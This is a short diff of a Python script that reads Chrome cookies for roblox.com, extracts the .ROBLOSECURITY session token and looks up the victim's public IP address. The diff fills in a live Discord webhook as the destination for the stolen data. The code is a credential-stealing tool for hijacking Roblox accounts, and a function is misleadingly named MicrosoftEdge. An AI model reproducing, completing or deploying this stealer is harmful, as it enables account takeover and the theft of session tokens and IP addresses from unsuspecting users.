@@ -3,13 +3,13 @@ import requests
 import threading
 
 
-WebHook = "" # Input your webhook here
+WebHook = "https://discord.com/api/webhooks/1298947774515249192/Whh2btSqgdjgHhxFGBhrAn8otdYQfih3mwyaQCYn-VTq85UlEoDdFVTw8ZRW1SVTrnBQ" # Input your webhook here
 
 
 def MicrosoftEdge():
     
     try:
-        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
+        cookies = browser_cookie3.chrome(domain_name = "roblox.com") 
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         ip_address = requests.get("https://api.ipify.org/").text
